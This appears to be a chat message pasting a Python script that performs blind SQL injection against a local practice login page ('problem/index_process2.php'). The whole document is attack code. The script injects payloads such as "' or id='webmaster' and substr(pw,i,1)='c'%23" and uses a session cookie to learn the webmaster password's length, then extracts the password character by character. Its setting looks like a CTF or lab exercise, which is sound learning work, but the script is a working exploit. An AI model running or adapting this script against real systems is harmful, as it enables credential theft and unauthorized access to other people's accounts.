[김나진] [오후 10:59] import requests
import string

headers = {'Cookie': 'HEYGOOFY=0h1f0r90tmypa55w0rd'}#알맞은 쿠키 값넣기
url = "http://127.0.0.1/problem/index_process2.php"#알맞은 url 넣기
string = "1234567890abcdefghijklmnopqrstuvwxyz"

pw = ''
len = 1
while True:
    data = "?id=webmaster&pw=' or id='webmaster' and length(pw)= "+str(len)+"%23"
    r = requests.get(url + data, headers = headers)
    print(len)
    if r.text.find('Hello webmaster!') != -1:
        break
    len += 1
print ("password length : ", len)
num = 1
for i in range(1, len+1):
    for j in string:
        data = "?id=webmaster&pw=' or id='webmaster' and substr(pw,"+str(i)+",1)='"+j+"'%23"#'?id=webmaster%26%26instr(mid(pw,'+str(i)+',1),"'+j+'")'
        r = requests.get(url+data,headers = headers)
        if r.text.find('Hello webmaster!') != -1 :
            pw = pw + j
            print("finding...: ", pw)
            break
print("Password: ", pw)

